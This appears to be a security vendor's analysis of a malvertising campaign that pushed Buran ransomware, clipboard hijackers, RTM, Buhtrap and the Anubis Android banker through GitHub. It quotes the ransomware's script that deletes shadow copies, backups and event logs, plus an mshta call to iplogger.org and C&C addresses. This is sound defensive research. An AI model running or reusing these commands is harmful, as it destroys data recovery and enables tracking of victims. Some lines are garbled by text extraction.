Therefore, we have decided to change our original detection name for this_\n_ransomware to Win32/Filecoder.Buran. This should minimize any additional confusion and be more in sync with other publications describing_\n_the same ransomware._\n\nWhat better way to target accountants than to target them as they search the web, looking for documents pertinent to their job? This is just\n[what has been happening for the past few months, where a group using two well-known backdoors — Buhtrap and](https://www.welivesecurity.com/2015/04/09/operation-buhtrap/) [RTM — as well as](https://www.welivesecurity.com/wp-content/uploads/2017/02/Read-The-Manual.pdf)\nransomware and cryptocurrency stealers, has targeted organizations, mainly in Russia. The targeting was made possible by posting\nmalicious ads through Yandex.Direct, in an attempt to redirect a potential target to a website offering malicious downloads disguised as\ndocument templates. Yandex is known to be the largest search engine on the internet in Russia. Yandex.Direct is its online advertising\nnetwork. We’ve contacted Yandex and they removed this malvertising campaign.\n\n\n-----\n\ne t e u t ap bac doo sou ce code as bee ea ed t e past a d ca t us be used by a yo e, code as ot, at east to ou\nknowledge. In this blog, we will describe how the threat actors distributed their malware by abusing Yandex.Direct and hosted it on GitHub.\nWe will conclude with a technical analysis of the malware used.\n\n## Distribution mechanism and victims\n\nThe link that ties the different payloads together is how they were distributed: all malicious files created by the cybercriminals were hosted on\ntwo different GitHub repositories.\n\nThere was usually only one malicious file downloadable from the repo, but it would change frequently. Since change history is available from\nthe GitHub repository, it allows us to know which malware was distributed at any given time. One way victims would be lured into downloading\nthese malicious files was through a website, blanki-shabloni24[.]ru, as shown in Figure 1.\n\n_Figure 1. Landing page of blanki-shabloni24[.]ru_\n\nThe website design as well as all malicious filenames were quite revealing: they were all about forms, templates and contracts. The fake\nsoftware name translates to: “Collection of Templates 2018: forms, templates, contracts, samples”. Given the fact that Buhtrap and RTM have\nbeen used in the past to target accounting departments, we immediately believed that a similar strategy was at play. But how were potential\nvictims directed to the website?\n\n## Infection campaigns\n\nAt least some of the potential victims who ended up on this website were lured there through malvertising. Below you can see an example of\na redirect URL to the malicious website:\n\nhttps://blanki-shabloni24.ru/?utm_source=yandex&utm_medium=banner&utm_campaign=cid|\n{blanki_rsya}|context&utm_content=gid|3590756360|aid|6683792549|15114654950_&utm_term=скачать бланк\n**счета&pm_source=bb.f2.kz&pm_block=none&pm_position=0&yclid=1029648968001296456**\n\nWe can see in the URL that a banner ad was posted on bb.f2[.]kz, which is a legitimate accounting forum. It is important to note here that\nthese banners appeared on several different websites, all with the same campaign id (blanki_rsya) and most of them related to accounting or\nlegal aid services. From the URL, we can also see what the user was searching for – “скачать бланк счета” or “download invoice template” –\nreinforcing our hypothesis that organizations are targeted. A list of the websites where the banners and the related search term appeared is\nshown in Table 1.\n\n\n-----\n\n**Search term RU** **Search term EN (Google Translate)** **Domain**\n\nскачать бланк счета download invoice template bb.f2[.]kz\n\nобразец договора contract example Ipopen[.]ru\n\nзаявление жалоба образец claim complaint example 77metrov[.]ru\n\nбланк договора contract form blank-dogovor-kupli-prodazhi[.]ru\n\nсудебное ходатайство образец judicial petition example zen.yandex[.]ru\n\nобразец жалобы example complaint yurday[.]ru\n\nобразцы бланков договоров example contract forms Regforum[.]ru\n\nбланк договора contract form assistentus[.]ru\n\nобразец договора квартиры example apartment contract napravah[.]com\n\nобразцы юридических договоров examples of legal contracts avito[.]ru\n\n_Table 1. Search terms used and domains where the banners were displayed_\n\nThe blanki-shabloni24[.]ru website was probably set up in this way to survive basic scrutiny. An ad pointing to a professional-looking website\nwith a link to GitHub is not something obviously bad. Moreover, the cybercriminals put the malicious files on their GitHub repository only for a\nlimited period of time, probably while the ad campaign was active. Most of the time, the payload on GitHub was an empty zip file or a clean\nexecutable. To summarize, the cybercriminals were able to distribute ads through the Yandex.Direct service to websites that were likely to be\nvisited by accountants searching for specific terms.\n\nLet’s now take a look at the different payloads that were distributed this way.\n\n## Payload Analysis\n\n Distribution timeline\n\nThis malware campaign started in late October 2018 and is still active at time of writing. Since the whole repository was publicly available on\nGitHub, we were able to draw a precise timeline of the malware families distributed (see Figure 2). We’ve observed six different malware\nfamilies being hosted on GitHub over this period. We’ve added a line that illustrates when the banner links were seen, based on ESET\ntelemetry, to compare it with the git history. We can see that it correlates pretty well with the moments the payloads were available on GitHub.\nThe discrepancy at the end of February may be explained by the possibility that we lack some of the history because the repository was\nremoved from GitHub before we were able to fetch all of it.\n\n_Figure 2. Timeline of the malware distribution_\n\n## Code-signing certificates\n\nMultiple code-signing certificates were used to sign malware distributed during this campaign. Some of the certificates were used to sign\nmore than one malware family, an additional indicator linking the various malware samples to the same campaign. The operators did not\nsystematically sign the binaries they pushed to the git repository It is surprising given that they had access to the private key of these\n\n\n-----\n\nce t cates, t at t ey d d t use t o a o t e t t e e d o eb ua y 0 9, t e ope ato s a so sta ted to a e a d s g atu es t a\ncertificate belonging to Google for which they do not possess the private key.\n\nAll the certificates involved in this campaign, and the malware families that they signed, are displayed in Table 2.\n\n**Cert’s CN** **Thumbprint** **Signed malware family**\n\nTOV TEMA LLC 775E9905489B5BB4296D1AD85F3E45BC936E7FDC Win32/ClipBanker\n\nTOV \"MARIYA\" EE6FAF6FD2888A6D11DD710B586B78E794FC74FC Win32/ClipBanker\n\n\"VERY EXCLUSIVE LTD\" BD129D61914D3A6B5F4B634976E864C91B6DBC8E Win32/Spy.Buhtrap\n\n\"VERY EXCLUSIVE LTD.\" 764F182C1F46B380249CAFB8BA3E7487FAF21E2A Win32/Filecoder.Buran\n\nTRAHELEN LIMITED 7C1D7CE90000B0E603362F294BC4A85679E38439 Win32/Spy.RTM\n\nLEDI, TOV 15FEA3B0B839A58AABC6A604F4831B07097C8018 Win32/Filecoder.Buran\n\nGoogle Inc 1A6AC0549A4A44264DEB6FF003391DA2F285B19F Win32/Filecoder.Buran\nMSIL/ClipBanker\n\n_Table 2. List of certificates and malware signed by them_\n\nWe also used these code-signing certificates to see if we could establish links with other malware families. For most of the certificates, we\ndidn’t find malware that wasn’t distributed via the GitHub repository. However, in the case of the TOV “MARIYA” certificate, it was used to sign\n[malware belonging to the Wauchos botnet as well as some adware and coin miners. It is very unlikely that these malware variants were linked](https://www.welivesecurity.com/2018/01/04/wauchos-now-headed-extinction/)\nto the campaign we analyzed. It is probable that the certificate involved was bought on some online black market.\n\n## Win32/Filecoder.Buran\n\nThe component that first attracted our attention is the previously unseen Win32/Filecoder.Buran. It is a Delphi binary that sometimes comes\npacked. It was mainly distributed during February and March of 2019. It implements the expected behavior of ransomware, discovering local\ndrives and network shares and encrypting files found on these devices. It doesn’t require an internet connection to encrypt its victims’ files,\nsince it doesn’t communicate with a server to send the encryption keys. Instead, it appends a “token” at the end of the ransom message and\ndemands that the victims communicate with the operators via email or Bitmessage. The ransom note may be found in Appendix A.\n\nTo encrypt as many important resources as possible, Filecoder.Buran starts a thread dedicated to killing key software that might have open\nhandles on files containing valuable data, thus preventing them being encrypted. The targeted processes are mainly database management\nsystems (DBMS). Furthermore, Filecoder.Buran removes log files and backups, to make it as difficult as possible for victims without any\noffline backups to recover their files. To do so, the batch script in Figure 3 is executed.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\nbcdedit /set {default} bootstatuspolicy ignoreallfailures\n\nbcdedit /set {default} recoveryenabled no\n\nwbadmin delete catalog -quiet\n\nwbadmin delete systemstatebackup\n\nwbadmin delete systemstatebackup -keepversions:0\n\nwbadmin delete backup\n\nwmic shadowcopy delete\n\nvssadmin delete shadows /all /quiet\n\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\n\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\"\n\nattrib \"%userprofile%\\documents\\Default.rdp\" -s -h\n\ndel \"%userprofile%\\documents\\Default.rdp\"\n\nwevtutil.exe clear-log Application\n\nwevtutil.exe clear-log Security\n\nwevtutil.exe clear-log System\n\nsc config eventlog start=disabled\n\n\n_Figure 3. Script to remove backups and log files_\n\nFilecoder.Buran uses the legitimate online service IP Logger, which is designed to gather information about who is visiting a website. This is\nused to keep track of the ransomware’s victims. The command line in Figure 4 is responsible for this.\n\n\n1\n\n2\n\n\nmshta.exe \"javascript:document.write('<img\n\nsrc=\\'https://iplogger.org/173Es7.txt\\'><script>setInterval(function(){close();},10000);</script>');\"\n\n\n_Figure 4. Query to iplogger.org_\n\nFiles that are encrypted are chosen based on failing to match three exclusion lists. First, it does not encrypt files with the following extensions:\n.com, .cmd, .cpl, .dll, .exe, .hta, .lnk, .msc, .msi, .msp, .pif, .scr, .sys and .bat. Second, all files for which the full path contains one of the\ndirectory strings listed in Figure 5 are excluded.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\n\\.{ED7BA470-8E54-465E-825C-99712043E01C}\\\n\n\\tor browser\\\n\n\\opera\\\n\n\\opera software\\\n\n\\mozilla\\\n\n\\mozilla firefox\\\n\n\\internet explorer\\\n\n\\google\\chrome\\\n\n\\google\\\n\n\\boot\\\n\n\\application data\\\n\n\\apple computer\\safari\\\n\n\\appdata\\\n\n\\all users\\\n\n:\\windows\\\n\n:\\system volume information\\\n\n:\\nvidia\\\n\n:\\intel\\\n\n\n_Figure 5. Directories excluded from encryption_\n\nAnd third, specific filenames are excluded from encryption, among them the filename of the ransom note. Figure 6 shows this list. Combined,\nthese exclusions are clearly intended to leave an encrypted victim machine bootable, and minimally usable.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n\nboot.ini\n\nbootfont.bin\n\nbootsect.bak\n\ndesktop.ini\n\niconcache.db\n\nntdetect.com\n\nntldr\n\nntuser.dat\n\nntuser.dat.log\n\nntuser.ini\n\nthumbs.db\n\nwinupas.exe\n\nyour files are now encrypted.txt\n\nwindows update assistant.lnk\n\nmaster.exe\n\nunlock.exe\n\nunlocker.exe\n\n\n_Figure 6. Files excluded from encryption_\n\n### Fil ti h\n\n\n-----\n\nWhen the malware is launched, it generates a 512-bit RSA key pair. The private exponent (d) and the modulus (n) are then encrypted using a\nhardcoded 2048-bit public key (public exponent and modulus), zlib compressed and base64 encoded. The code responsible for this is shown\nin Figure 7.\n\n_Figure 7. Hex-Rays decompiler output of the 512-bit RSA key pair generation routine_\n\nFigure 8 shows an example of the plaintext version of the generated private key that constitutes the token appended to the ransom note.\n\n1 <N>DF9228F4F3CA93314B7EE4BEFC440030665D5A2318111CC3FE91A43D781E3F91BD2F6383E4A0B4F503916D75C9C576D5C2F2F\n<D>9197ECC0DD002D5E60C20CE3780AB9D1FE61A47D9735036907E3F0CF8BE09E3E7646F8388AAC75FF6A4F60E7F4C2F697BF6E\n\n_Figure 8.

Hardcoded RSA public key_\n\nThe files are encrypted using AES-128-CBC with a 256-bit key. For each file to be encrypted, a new key and a new initialization vector are\ngenerated. The key information is appended to the end of the encrypted file. Let’s examine the format of an encrypted file.\n\nEncrypted files have the following header:\n\n**Magic Header** **Encrypted Size** **Decrypted size** **Encrypted data**\n\n0x56 0x1A uint64_t uint64_t encrypt('VEGA' + filedata[:0x5000])\n\nThe data from the original file prepended with the magic value “VEGA” is encrypted up to the first 0x5000 bytes. All the information necessary\nto decrypt the file is appended to the file with this structure:\n\n**File size marker** **Size of AES key blob** **AES key blob** **Size of RSA key blob** **RSA key blob** **Offset to File size marker**\n\n0x01 or 0x02 uint32_t uint32_t uint32_t\n\nFile size marker contains a flag that indicates if the file size is > 0x5000 bytes\nAES key blob = ZlibCompress(RSAEncrypt(AES Key + IV, generated RSA key pair’s public key))\nRSA key blob = ZlibCompress(RSAEncrypt(Generated RSA private key, Hardcoded RSA public key))\n\n## Win32/ClipBanker\n\nWin32/ClipBanker is a component that was distributed intermittently from the end of October to early December 2018. Its role is to monitor the\ncontent of the clipboard, looking for cryptocurrency addresses. If a targeted cryptocurrency address is found, it is replaced by an address\npresumably belonging to the malware operator. The samples we looked at are not packed, nor obfuscated. The only mechanism used to hide\n\n\n-----\n\nts be a o s st g e c ypt o e ope ato s c yptocu e cy add esses a e e c ypted us g C a ous c yptocu e c es a e ta geted\nsuch as Bitcoin, Bitcoin cash, Dogecoin, Ethereum and Ripple.\n\nA very negligible amount of BTC was sent to the attacker’s Bitcoin addresses during the time of distribution, which suggests the campaign\nwasn’t very successful. Additionally, there is no way to be sure that these transactions are related to this malware.\n\n## Win32/RTM\n\nWin32/RTM is a component that was distributed during a few days at the beginning of March 2019. RTM is a banking trojan written in Delphi\n[that targets remote banking systems. Back in 2017, ESET researchers published a white paper that contains an extensive analysis of this](https://www.welivesecurity.com/wp-content/uploads/2017/02/Read-The-Manual.pdf)\nmalware. As little has changed since then, we suggest the interested reader should refer to that publication for more details. In January 2019,\n[Palo Alto Networks also released a blogpost about this malware.](https://unit42.paloaltonetworks.com/russian-language-malspam-pushing-redaman-banking-malware/)\n\n## Buhtrap downloader\n\nFor a short period of time, the package available from GitHub was a downloader that shared no resemblance with past Buhtrap tooling. This\ndownloader reaches out to https://94.100.18[.]67/RSS.php?<some_id> to get the next stage and load it directly in memory. We identified two\ndifferent behaviors for this second stage code. In one, the RSS.php URL served the Buhtrap backdoor directly. This backdoor is very similar\nto the one available through the leaked source code.\n\nOf interest here is that we see several different campaigns using the Buhtrap backdoor, presumably coming from different actors. The main\ndifferences in this case are that, first, the backdoor is loaded directly in memory, not using the usual DLL side-loading trick documented in our\n[previous blog, and second, they changed the RC4 key used to encrypt network traffic to the C&C server. Most of the campaigns we see in the](https://www.welivesecurity.com/2015/04/09/operation-buhtrap/)\nwild do not even bother to change this key.\n\nIn the other, more intricate, case we’ve seen, the RSS.php URL served another downloader. This downloader implements some obfuscation\nsuch as dynamic import table reconstruction. The ultimate goal of this downloader is to contact a C&C server at\nhttps://msiofficeupd[.]com/api/F27F84EDA4D13B15/2 to send logs and wait for a response. It treats the latter as a binary blob, loads it in\nmemory and executes it. The payload we’ve seen this downloader execute was the same Buhtrap backdoor described above, but other\npayloads may exist.\n\n## Android/Spy.Banker\n\nInterestingly, an Android component was also found on the GitHub repository. It was only on the master branch for one day on November 1st\n2018. Apart from the fact that is was hosted on GitHub on that day, ESET telemetry shows no evidence of active distribution of this malware.\n\nThe Android component was hosted on GitHub as an Android Application Package (APK). It is heavily obfuscated. The malicious behavior is\nconcealed in an encrypted JAR located in the APK. It is encrypted with RC4 using this key:\n\nkey = [\n\n0x87, 0xd6, 0x2e, 0x66, 0xc5, 0x8a, 0x26, 0x00, 0x72, 0x86, 0x72, 0x6f,\n\n0x0c, 0xc1, 0xdb, 0xcb, 0x14, 0xd2, 0xa8, 0x19, 0xeb, 0x85, 0x68, 0xe1,\n\n0x2f, 0xad, 0xbe, 0xe3, 0xb9, 0x60, 0x9b, 0xb9, 0xf4, 0xa0, 0xa2, 0x8b, 0x96\n\n]\n\nThe same key and algorithm are used to encrypt the strings. The JAR is located under APK_ROOT + image/files. The first 4 bytes of the file\ncontain the length of the encrypted JAR, which begins immediately after the length field.\n\n[Once we decrypted the file, it became obvious that it was Anubis, an already documented Android Banker. This malware has the following](https://news.sophos.com/en-us/2018/08/14/anubis-is-back-are-you-prepared/)\ncapabilities:\n\nRecord microphone\nTake screenshot\nGet GPS position\nLog keystrokes\nEncrypt device data and demand ransom\nSend spam\n\nThe C&C servers are:\n\nsositehuypidarasi[.]com\nktosdelaetskrintotpidor[.]com\n\nInterestingly, it used Twitter as a fallback communication channel to retrieve another C&C server. The Twitter account used by the sample we\nanalyzed is @JohnesTrader, but this account was already suspended at time of analysis.\n\n\n-----\n\ne a a e co ta s a st o ta geted app cat o s o t e d o d de ce s st see s to be o ge t a at t as bac e Sop os\nresearchers analyzed it. It targets a lot of banking applications for banks from all over the world, some e-shopping apps like Amazon and\neBay and cryptocurrency apps. We have included the full list in Appendix B.\n\n## MSIL/ClipBanker.IH\n\nThe latest component to be distributed during the campaign covered in this blogpost is a .NET Windows executable which was distributed in\nMarch 2019. Most of the versions we looked at were packed with ConfuserEx v1.0.0. As with the ClipBanker variant described above, this\ncomponent also hijacks the clipboard. It targets a wide range of cryptocurrencies as well as Steam trade offers. Furthermore, it uses the IP\nLogger service to exfiltrate Bitcoin’s WIF private key.\n\n### Defensive mechanisms\n\nIn addition to benefiting from ConfuserEx’s anti-debugging, anti-dumping and anti-tampering mechanisms, this malware implements detection\nroutines for security products and virtual machines.\n\nTo check if it is running in a virtual machine, it uses Windows’ built-in WMI command-line (WMIC) to query information about the BIOS –\nspecifically:\n\nwmic bios\n\nIt then parses the output of the command looking for these specific keywords: VBOX, VirtualBox, XEN, qemu, bochs, VM.\n\nTo detect security products, the malware sends a Windows Management Instrumentation (WMI) query to Windows Security Center using the\nManagementObjectSearcher API as shown in Figure 10. Once base64-decoded, the call is:\n\nManagementObjectSearcher(‘root\\\\SecurityCenter2’, ‘SELECT * FROM AntivirusProduct’)\n\n_Figure 10. Security product detection routine_\n\n[Furthermore, the malware checks whether CryptoClipWatcher, a defensive tool designed to protect users from clipboard hijacking, is running](https://ccw.e-paths.com/)\nand if so, suspends all the threads of this process – thus disabling the protection.\n\n### Persistence\n\nIn the version we analyzed, the malware copies itself into %APPDATA%\\google\\updater.exe and sets the hidden flag on the google directory.\nThen, it modifies the Windows Registry’s Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\shell value and appends the path of\nupdater.exe. Hence, every time a user logs in, the malware is executed.\n\n### Malicious behavior\n\nAs was the case with the previous ClipBanker we analyzed, this .NET malware monitors the content of the clipboard, looking for\ncryptocurrency addresses – and if one is found, it is replaced with one of the operator’s addresses. Figure 11 displays a list of the targeted\naddresses based on an enum found within the code.\n\n1 BTC_P2PKH, BTC_P2SH, BTC_BECH32, BCH_P2PKH_CashAddr, BTC_GOLD, LTC_P2PKH, LTC_BECH32, LTC_P2SH_M,\nETH_ERC20, XMR, DCR, XRP, DOGE, DASH, ZEC_T_ADDR, ZEC_Z_ADDR, STELLAR, NEO, ADA, IOTA, NANO_1, NANO_3,\nBANANO_1, BANANO_3, STRATIS, NIOBIO, LISK, QTUM, WMZ, WMX, WME, VERTCOIN, TRON, TEZOS, QIWI_ID, YANDEX_ID,\nNAMECOIN, B58_PRIVATEKEY, STEAM_URL\n\n_Figure 11. Enum symbol for supported address types_\n\nFor each of these address types there is an associated regular expression. The STEAM_URL value is for hijacking Steam’s trade offer\nsystem, as we can see in the regular expression used to detect it in the clipboard:\n\n\n-----\n\n\\b( ttps \\/\\/| ttp \\/\\/|)stea co u ty\\ co \\/t adeo e \\/ e \\/\\ pa t e [0 9] &to e [a 0 9] \\b\n\n### Exfiltration channel\n\nIn addition to replacing addresses in the clipboard, this .NET malware also targets Bitcoin WIF private keys, Bitcoin Core wallets and\nElectrum Bitcoin wallets. The malware uses iplogger.org as an exfiltration channel to capture the WIF private key. To do so, the operators add\nthe private key data in the User-Agent HTTP header as shown in Figure 12.\n\n_Figure 12. IP Logger console with exfiltrated data_\n\nAs for the exfiltration of the wallets, the operators did not use iplogger.org; the limitation of 255 characters in the User-Agent field displayed in\nIP Logger’s web interface might explain why they opted for another method. In the samples we analyzed, the other exfiltration server was\nstored in the environment variable DiscordWebHook. What’s puzzling to us is that this environment variable is never set anywhere in the\ncode. This seems to suggest that the malware is still under development and that this variable is set on the operators’ test machines.\n\nThere is another indicator that the malware is still under development. The binary includes two iplogger.org URLs, and both are queried upon\nexfiltration. In the request to one of these URLs, the value in the Referer field is prepended by “DEV /”. We also found a version of the\nmalware that wasn’t packed with ConfuserEx and the getter for this URL is called DevFeedbackUrl. Based on the name of the environment\n[variable, we believe the operators are planning on using the legitimate service Discord and abuse its webhook system to exfiltrate](https://discordapp.com/)\ncryptocurrency wallets.\n\n## Conclusion\n\nThis campaign is a good example of how legitimate ad services can be abused to distribute malware. While this campaign specifically targets\nRussian organizations, we wouldn’t be surprised if such a scheme were used abusing non-Russian ad services. To avoid being caught by\nsuch a scam, users should always make sure the source from where they download software is a well-known, reputable software distributor.\n\n## Indicators of Compromise
